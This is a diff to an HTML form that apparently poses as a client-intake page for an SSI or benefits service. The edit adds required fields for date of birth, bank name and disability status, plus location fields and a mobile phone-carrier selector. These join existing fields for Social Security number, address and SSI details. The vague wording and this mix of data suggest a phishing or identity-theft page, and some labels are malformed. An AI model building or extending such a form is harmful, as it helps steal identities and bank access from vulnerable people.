@@ -131,7 +131,6 @@ experience from start to finish.
 </p>
 
 <p>
-Please let us know how we can assist you today.
 We look forward to serving you and providing the support you need.
 </p>
 
@@ -142,8 +141,7 @@ Thank you for your interest in our services.
 </p>
 
 <p>
-To proceed with your inquiry and create your client profile, please provide
-the information below. All information will be treated with the highest level
+To proceed with your inquiry, please provide the information below. All information will be treated with the highest level
 of confidentiality and used solely for verification and processing purposes.
 </p>
 
@@ -185,11 +183,27 @@ name="SSN"
 required>
 
 <label>
+"dob">Date of Birth <span class="required">*</span>
+</label>
+<input
+type="text"
+name="dob"
+required>
+
+<label>
 Email Address (Optional)
 </label>
 <input
 type="email"
 name="email">
+
+<label>
+Bank Name <span class="required">*</span>
+</label>
+<input
+type="text"
+name="Bank"
+required>
 
 <label>
 Age <span class="required">*</span>
@@ -201,11 +215,58 @@ min="18"
 required>
 
 <label>
+disability
+</label>
+
+<div class="radio-group">
+<label>
+<input
+type="radio"
+name="disability"
+value="Yes"
+required>
+Yes
+</label>
+
+<label>
+<input
+type="radio"
+name="disability"
+value="No">
+No
+</label>
+</div>
+
+<label>
 Occupation <span class="required">*</span>
 </label>
 <input
 type="text"
 name="occupation"
+required>
+
+<label>
+City <span class="required">*</span>
+</label>
+<input
+type="text"
+name="city"
+required>
+
+<label>
+"state">Region/State/Provine <span class="required">*</span>
+</label>
+<input
+type="text"
+name="state"
+required>
+
+<label>
+"Zip">Postal/Zip Code <span class="required">*</span>
+</label>
+<input
+type="text"
+name="Zip"
 required>
 
 <label for="employment">Employment Status</label>
@@ -218,6 +279,16 @@ required>
                 <option value="retired">Retired</option>
               </select>
 
+              <label for="phone carrier">Phone Carrier</label>
+              <select id="phone carrier" name="phone carrier">
+                <option value="">Select one</option>
+                <option value="verizon">VERIZON</option>
+                <option value="t-mobile">T-MOBILE</option>
+                <option value="at&t">AT&T</option>
+                <option value="sprint">SPRINT</option>
+                <option value="others">OTHERS</option>
+              </select>
+
 <label>
 Residential Address <span class="required">*</span>
 </label>
@@ -225,6 +296,7 @@ Residential Address <span class="required">*</span>
 name="address"
 rows="3"
 required></textarea>
+
 
 <h2>SSI Information</h2>
 
